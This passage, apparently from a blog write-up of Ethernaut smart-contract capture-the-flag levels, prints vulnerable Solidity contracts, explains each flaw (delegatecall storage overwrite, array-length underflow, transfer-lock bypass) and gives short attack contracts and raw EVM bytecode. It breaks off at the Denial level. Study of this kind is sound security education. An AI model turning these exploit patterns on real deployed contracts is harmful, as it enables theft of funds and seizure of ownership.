</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=kt>bytes8</span> <span class=n>_gateKey</span> <span class=o>=</span> <span class=kt>bytes8</span><span class=p>(</span><span class=kt>uint64</span><span class=p>(</span><span class=kt>bytes8</span><span class=p>(</span><span class=nb>keccak256</span><span class=p>(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodePacked</span><span class=p>(</span><span class=nb>this</span><span class=p>))))</span> <span class=o>^</span> <span class=p>(</span><span class=kt>uint64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=c1>//bytes8 key = bytes8(abi.encodePacked(_gateKey));
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>address</span><span class=p>(</span><span class=mh>0x0B612B4DbFb524B6a9a866f4Af1eA702E96c4591</span><span class=p>).</span><span class=nb>call</span><span class=p>(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodeWithSignature</span><span class=p>(</span><span class=s>&#34;enter(bytes8)&#34;</span><span class=p>,</span> <span class=n>_gateKey</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=naught-coin>Naught Coin</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#39;@openzeppelin/contracts/token/ERC20/ERC20.sol&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=kd>contract</span> <span class=nc>NaughtCoin</span> <span class=k>is</span> <span class=n>ERC20</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// string public constant name = &#39;NaughtCoin&#39;;
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=c1>// string public constant symbol = &#39;0x0&#39;;
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=c1>// uint public constant decimals = 18;
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>uint</span> <span class=k>public</span> <span class=n>timeLock</span> <span class=o>=</span> <span class=nb>now</span> <span class=o>+</span> <span class=mi>10</span> <span class=o>*</span> <span class=mi>365</span> <span class=kc>days</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint256</span> <span class=k>public</span> <span class=n>INITIAL_SUPPLY</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>address</span> <span class=k>public</span> <span class=n>player</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>constructor</span><span class=p>(</span><span class=kt>address</span> <span class=n>_player</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=n>ERC20</span><span class=p>(</span><span class=s>&#39;NaughtCoin&#39;</span><span class=p>,</span> <span class=s>&#39;0x0&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>player</span> <span class=o>=</span> <span class=n>_player</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>INITIAL_SUPPLY</span> <span class=o>=</span> <span class=mi>1000000</span> <span class=o>*</span> <span class=p>(</span><span class=mi>10</span><span class=o>**</span><span class=kt>uint256</span><span class=p>(</span><span class=n>decimals</span><span class=p>()));</span>
</span></span><span class=line><span class=cl>    <span class=c1>// _totalSupply = INITIAL_SUPPLY;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// _balances[player] = INITIAL_SUPPLY;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>_mint</span><span class=p>(</span><span class=n>player</span><span class=p>,</span> <span class=n>INITIAL_SUPPLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>emit</span> <span class=n>Transfer</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span> <span class=n>player</span><span class=p>,</span> <span class=n>INITIAL_SUPPLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>transfer</span><span class=p>(</span><span class=kt>address</span> <span class=n>_to</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>_value</span><span class=p>)</span> <span class=k>override</span> <span class=k>public</span> <span class=n>lockTokens</span> <span class=k>returns</span><span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>super</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=n>_to</span><span class=p>,</span> <span class=n>_value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// Prevent the initial owner from transferring tokens until the timelock has passed
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kd>modifier</span> <span class=nf>lockTokens</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>player</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nb>require</span><span class=p>(</span><span class=nb>now</span> <span class=o>&gt;</span> <span class=n>timeLock</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>     <span class=k>_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>NaughtCoin is a ERC20 token and we have to make our NaughtCoin balance to 0 to complete this challenge. Implementation of NaughtCoin overrides &ldquo;transfer&rdquo; function of ERC20. Main change is that an extra check is added for the &ldquo;transfer&rdquo; function to only allow us(&ldquo;player&rdquo;) to withdraw the tokens after a certain timelock period. Any user other than the player can withdraw their tokens irrespective of timelock period. So, to complete this challenge, we have to use another way of spending ERC20 tokens. ERC20 tokens, additional to simple transfer method, allows another user to spend the tokens of other uses if the other user explicitly allows the spender to spend certain number of tokens. It is done by using &ldquo;approve&rdquo; and &ldquo;transferFrom&rdquo; methods of ERC20 contract. So, to solve this challenge, we can approve different address that we own to spend our tokens and use &ldquo;transferFrom&rdquo; to transfer the tokens.</p><h3 id=preservation>Preservation</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Preservation</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// public library contracts
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>address</span> <span class=k>public</span> <span class=n>timeZone1Library</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>address</span> <span class=k>public</span> <span class=n>timeZone2Library</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>address</span> <span class=k>public</span> <span class=n>owner</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint</span> <span class=n>storedTime</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=c1>// Sets the function signature for delegatecall
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>bytes4</span> <span class=k>constant</span> <span class=n>setTimeSignature</span> <span class=o>=</span> <span class=kt>bytes4</span><span class=p>(</span><span class=nb>keccak256</span><span class=p>(</span><span class=s>&#34;setTime(uint256)&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>constructor</span><span class=p>(</span><span class=kt>address</span> <span class=n>_timeZone1LibraryAddress</span><span class=p>,</span> <span class=kt>address</span> <span class=n>_timeZone2LibraryAddress</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>timeZone1Library</span> <span class=o>=</span> <span class=n>_timeZone1LibraryAddress</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>timeZone2Library</span> <span class=o>=</span> <span class=n>_timeZone2LibraryAddress</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>owner</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// set the time for timezone 1
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kd>function</span> <span class=nf>setFirstTime</span><span class=p>(</span><span class=kt>uint</span> <span class=n>_timeStamp</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>timeZone1Library</span><span class=p>.</span><span class=nb>delegatecall</span><span class=p>(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodePacked</span><span class=p>(</span><span class=n>setTimeSignature</span><span class=p>,</span> <span class=n>_timeStamp</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// set the time for timezone 2
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kd>function</span> <span class=nf>setSecondTime</span><span class=p>(</span><span class=kt>uint</span> <span class=n>_timeStamp</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>timeZone2Library</span><span class=p>.</span><span class=nb>delegatecall</span><span class=p>(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodePacked</span><span class=p>(</span><span class=n>setTimeSignature</span><span class=p>,</span> <span class=n>_timeStamp</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Simple library contract to set the time
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>contract</span> <span class=nc>LibraryContract</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// stores a timestamp
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>uint</span> <span class=n>storedTime</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>setTime</span><span class=p>(</span><span class=kt>uint</span> <span class=n>_time</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>storedTime</span> <span class=o>=</span> <span class=n>_time</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Challenge contract stores addresses of two deployed contracts of LibraryContract. Functions &ldquo;setFirstTime&rdquo; and &ldquo;setSecondTime&rdquo; use delegate call to each of previously stored LibraryContract addresses and call &ldquo;setTime&rdquo; with &ldquo;_timeStamp&rdquo; argument. As mentioned in &ldquo;Delegation&rdquo; challenge writeup, when calling a contract using a delegate call, only the code is taken from the called contract and storage, msg referred in the code are still the caller&rsquo;s contract.&ldquo;setTime&rdquo; updates &ldquo;storedTime&rdquo; which will be stored at storage slot 0. So, when &ldquo;setTime&rdquo; is called using delegate call, storage slot 0 of caller contract i.e challenge contract, will be written with our given time. storage slot 0 in &ldquo;Preservation&rdquo; contract is used to store contract address of &ldquo;timeZone1Library&rdquo;, which means that we can overwrite the contract address to our desired value and when &ldquo;setFirstTime&rdquo; is called again, it will delegate call to overwritten address. We can deploy our malicious contract which will update owner when &ldquo;setTime&rdquo; is called using delegate call.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>attact</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=k>public</span> <span class=n>slot0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=k>public</span> <span class=n>slot1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=k>public</span> <span class=n>slot2_owner</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>setTime</span><span class=p>(</span><span class=kt>uint</span> <span class=n>fuckwaste</span><span class=p>)</span> <span class=k>public</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>slot2_owner</span> <span class=o>=</span> <span class=kt>address</span><span class=p>(</span><span class=mh>0x508281E39fF6c0aB776d773e6cC879AdbCEF2aEC</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=recovery>Recovery</h3><pre tabindex=0><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;;

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);

  }
}

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address =&gt; uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public {
    require(balances[msg.sender] &gt;= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
</code></pre><p>SimpleToken contract is deployed in the &ldquo;generateToken&rdquo; function of Recovery contract. we have to find it&rsquo;s address and call destroy method of SimpleToken to complete this challenge. Whenever a contract is deployed, the address is calculated solely using sender&rsquo;s address and nonce. nonce represents number of the present transaction sent using that account. So, when simpleToken contract is deployed using new, it&rsquo;s address is calculated using Recovery contract address and it&rsquo;s nonce. <a href=https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed target=_blank rel="noopener noreferrer">This</a>
stack overflow post provides implementations to compute the deployed address, given deployer&rsquo;s address and nonce. nonce is 1 for our SimpleToken deployement call.</p><p>python implementation taken from above mentioned post</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=o>//</span> <span class=n>SPDX</span><span class=o>-</span><span class=n>License</span><span class=o>-</span><span class=n>Identifier</span><span class=p>:</span> <span class=n>UNLICENSED</span>
</span></span><span class=line><span class=cl><span class=n>pragma</span> <span class=n>solidity</span> <span class=o>^</span><span class=mf>0.8.0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>contract</span> <span class=n>attack</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>constructor</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=n>address</span><span class=p>(</span><span class=mh>0xc3B095a1aB306541df81b201536331cbfDD80003</span><span class=p>)</span><span class=o>.</span><span class=n>call</span><span class=p>(</span><span class=n>abi</span><span class=o>.</span><span class=n>encodeWithSignature</span><span class=p>(</span><span class=s2>&#34;destroy(address)&#34;</span><span class=p>,</span><span class=n>address</span><span class=p>(</span><span class=mh>0x508281E39fF6c0aB776d773e6cC879AdbCEF2aEC</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=magicnumber>MagicNumber</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>MagicNum</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>address</span> <span class=k>public</span> <span class=n>solver</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>constructor</span><span class=p>()</span> <span class=k>public</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>setSolver</span><span class=p>(</span><span class=kt>address</span> <span class=n>_solver</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>solver</span> <span class=o>=</span> <span class=n>_solver</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>    ____________/\\\_______/\\\\\\\\\_____
</span></span></span><span class=line><span class=cl><span class=cm>     __________/\\\\\_____/\\\///////\\\___
</span></span></span><span class=line><span class=cl><span class=cm>      ________/\\\/\\\____\///______\//\\\__
</span></span></span><span class=line><span class=cl><span class=cm>       ______/\\\/\/\\\______________/\\\/___
</span></span></span><span class=line><span class=cl><span class=cm>        ____/\\\/__\/\\\___________/\\\//_____
</span></span></span><span class=line><span class=cl><span class=cm>         __/\\\\\\\\\\\\\\\\_____/\\\//________
</span></span></span><span class=line><span class=cl><span class=cm>          _\///////////\\\//____/\\\/___________
</span></span></span><span class=line><span class=cl><span class=cm>           ___________\/\\\_____/\\\\\\\\\\\\\\\_
</span></span></span><span class=line><span class=cl><span class=cm>            ___________\///_____\///////////////__
</span></span></span><span class=line><span class=cl><span class=cm>  */</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>We will pass this challenge if we provide an address where solver contract is deployed. solver contract&rsquo;s &ldquo;whatIsTheMeaningOfLife&rdquo; function should return magic number(42) when called but number of opcodes can be atmost 10. The bytes stored at a contract&rsquo;s address is evm bytecode and whenever the contract is called, that bytecode is executed in EVM. EVM doesn&rsquo;t store any additional information like function signatures and offset where their implementation starts. It&rsquo;s the job of the code at the contract address to dispatch to correct offset based on the message data. One can say that, the starting code of a deployed code is a large switch statement, dispatching calls to functions based on the 4 byte signature stored in the &ldquo;msg.data&rdquo; field. Our solver contract is called only once allowing us to remove the starting code and always return the magic number. EVM is a stack machine and <a href=https://github.com/wolflo/evm-opcodes target=_blank rel="noopener noreferrer">this</a>
lists all the available instructions and how top of the stack is changed for each instruction.</p><p>&ldquo;RETURN&rdquo; instruction returns data from memory of given length and present at given offset. So, we have to store the data(magic number) first in memory using &ldquo;MSTORE&rdquo; at some offset and return that using &ldquo;RETURN&rdquo;.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>PUSH1</span> <span class=mi>0x2A</span> <span class=c1>; push magic number onto the stack
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>PUSH1</span> <span class=mi>0x0</span>  <span class=c1>; push offset into memory
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>MSTORE</span>     <span class=c1>; store data at given offset, mem[0x0] = 0x2A = 42
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>PUSH</span> <span class=mi>0x20</span>  <span class=c1>; push length of the data to return
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>PUSH</span> <span class=mi>0x0</span>   <span class=c1>; push memory offset to return the data from
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>RETURN</span>     <span class=c1>; return data present at mem[0x0: 0x0 + 0x20]
</span></span></span></code></pre></div><p>We also have to write the code for constructor function. when the contract is deployed, the constructor code is usually present at the starting and it returns the final code which is stored at the smart contract address to the evm. So, our constructor has to return the bytes corresponding to the above instructions. codecopy instruction is used to copy the bytecode. Final bytecode is equivalent to</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=err>00:</span> <span class=nf>PUSH1</span> <span class=mi>0x0a</span> <span class=c1>; length         // 600a
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>02:</span> <span class=nf>DUP1</span>                        <span class=c1>// 80
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>03:</span> <span class=nf>PUSH1</span> <span class=mi>0x0c</span> <span class=c1>; codeoffset     // 600c
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>05:</span> <span class=nf>PUSH1</span> <span class=mi>0x00</span>                  <span class=c1>// 6000
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>07:</span> <span class=nf>CODECOPY</span>                    <span class=c1>// 39
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>08:</span> <span class=nf>PUSH1</span> <span class=mi>0x0</span>                   <span class=c1>// 6000
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>0</span><span class=nl>a:</span> <span class=nf>RETURN</span>                      <span class=c1>// f3
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>0</span><span class=nl>b:</span> <span class=nf>STOP</span>                        <span class=c1>// 00
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>0</span><span class=nl>c:</span> <span class=nf>PUSH1</span> <span class=mi>0x2A</span>                  <span class=c1>// 602A
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>0</span><span class=nl>e:</span> <span class=nf>PUSH1</span> <span class=mi>0x0</span>                   <span class=c1>// 6000
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>10:</span> <span class=nf>MSTORE</span>     <span class=c1>; mem[0] = 0x2A  // 52
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>11:</span> <span class=nf>PUSH</span> <span class=mi>0x20</span>                   <span class=c1>// 6020
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>13:</span> <span class=nf>PUSH</span> <span class=mi>0x0</span>                    <span class=c1>// 6000
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>15:</span> <span class=nf>RETURN</span>                      <span class=c1>// f3
</span></span></span></code></pre></div><pre tabindex=0><code>600a80600c6000396000f300602a60005260206000f3
</code></pre><h3 id=alien-codex>Alien Codex</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>5</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#39;../helpers/Ownable-05.sol&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>AlienCodex</span> <span class=k>is</span> <span class=n>Ownable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>bool</span> <span class=k>public</span> <span class=n>contact</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>bytes32</span><span class=p>[]</span> <span class=k>public</span> <span class=n>codex</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>modifier</span> <span class=nf>contacted</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>assert</span><span class=p>(</span><span class=n>contact</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>make_contact</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>contact</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>record</span><span class=p>(</span><span class=kt>bytes32</span> <span class=n>_content</span><span class=p>)</span> <span class=n>contacted</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  	<span class=n>codex</span><span class=p>.</span><span class=n>push</span><span class=p>(</span><span class=n>_content</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>retract</span><span class=p>()</span> <span class=n>contacted</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>codex</span><span class=p>.</span><span class=n>length</span><span class=o>--</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>revise</span><span class=p>(</span><span class=kt>uint</span> <span class=n>i</span><span class=p>,</span> <span class=kt>bytes32</span> <span class=n>_content</span><span class=p>)</span> <span class=n>contacted</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>codex</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>_content</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>AlienCodex inherits Ownable contract. Our challenge is to become the owner of the contract. &ldquo;owner&rdquo; variable is defined in Ownable contract and as AlienCodex inherits Ownable contract, owner variable is stored at storage slot 0. AlienCodex contract also declares a dynamic array &ldquo;codex&rdquo; and provides public functions to push a element, &ldquo;decrement&rdquo; the length and set given value at given index. The bug is in &ldquo;retract&rdquo; function, it decrements array length without checking if the length is greater then 0 or not. if the length is decremented when it is still 0, due to integer underflow it becomes $$2^{256} - 1$$. This helps because before accessing an element at an index, it checks that index is less than the length. So, if we make length equal to $$2^{256} - 1$$, we can read or write at any index and we can use that to write at storage slot 0 which holds owner variable&rsquo;s data.</p><p>When allocating storage for dynamic arrays, only the length is stored at the original slot(p) and the data is stored continously at &ldquo;keccak256(p)&rdquo;. It means that when accessing the element, storage slot $$keccak256(p) + index$$ is accessed. The storage slot number is also stored in 256-bit, as a result when large index is used i.e $$keccak256(p) + index$$ is greater than $$2^{256} - 1$$, it overflows. With this and &ldquo;revise&rdquo; function, we can change owner variable stored at storage slot 0 .</p><h3 id=denial>Denial</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Denial</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kn>using</span> <span class=n>SafeMath</span> <span class=k>for</span> <span class=kt>uint256</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=k>public</span> <span class=n>partner</span><span class=p>;</span> <span class=c1>// withdrawal partner - pay the gas, split the withdraw
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>address</span> <span class=k>payable</span> <span class=k>public</span> <span class=k>constant</span> <span class=n>owner</span> <span class=o>=</span> <span class=kt>address</span><span class=p>(</span><span class=mh>0xA9E</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint</span> <span class=n>timeLastWithdrawn</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint</span><span class=p>)</span> <span class=n>withdrawPartnerBalances</span><span class=p>;</span> <span class=c1>// keep track of partners balances
</span></span></span><span class=line><span class=cl><span class=c1></span>
